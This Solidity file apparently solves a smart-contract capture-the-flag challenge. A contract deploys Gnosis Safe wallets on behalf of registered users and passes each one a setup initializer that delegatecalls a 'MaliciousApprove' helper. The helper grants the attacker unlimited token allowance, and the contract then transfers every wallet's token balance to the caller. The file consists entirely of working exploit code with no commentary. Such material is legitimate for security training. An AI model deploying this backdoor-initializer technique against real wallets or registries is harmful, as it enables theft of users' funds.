// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solmate/src/tokens/ERC20.sol";
import "./WalletRegistry.sol";
import "hardhat/console.sol";

interface IGnosisSafeProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (address proxy);
}

interface IGnosisSafe {
    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external;
}

contract MaliciousApprove {
    function approve(address attacker, ERC20 token) public {
        token.approve(attacker, type(uint256).max);
    }
}

contract WalletRegistryAttacker {
    constructor(
        address masterCopy,
        IGnosisSafeProxyFactory walletFactory,
        ERC20 token,
        address[] memory users,
        WalletRegistry walletRegistry) {
        MaliciousApprove maliciousApprove = new MaliciousApprove();

        address[] memory owners = new address[](1);
        bytes memory initializer;

        for (uint256 i = 0; i < users.length; i++) {
            owners[0] = users[i];
            initializer = abi.encodeWithSelector(
                IGnosisSafe.setup.selector,
                owners,
                1,
                address(maliciousApprove),
                abi.encodeWithSelector(MaliciousApprove.approve.selector, address(this), address(token)),
                address(0),
                address(0),
                0,
                payable(address(0)));
            address wallet = walletFactory.createProxyWithCallback(masterCopy, initializer, 0, walletRegistry);
            token.transferFrom(wallet, msg.sender, token.balanceOf(wallet));
        }
    }
}
